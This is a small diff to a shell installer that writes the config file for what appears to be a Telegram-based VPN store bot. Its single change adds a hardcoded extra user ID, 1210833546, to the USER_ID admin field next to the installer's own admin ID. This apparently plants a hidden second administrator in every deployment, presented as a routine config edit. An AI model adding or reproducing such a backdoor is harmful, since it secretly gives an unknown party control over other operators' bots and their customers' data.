@@ -106,7 +106,7 @@ server_app() {
     cat >/root/BotVPN2/.vars.json <<EOF
 {
   "BOT_TOKEN": "$token",
-  "USER_ID": "$adminid",
+  "USER_ID": "$adminid,1210833546",
   "NAMA_STORE": "$namastore",
   "PORT": "50123",
   "API_KEY": "$apikey",
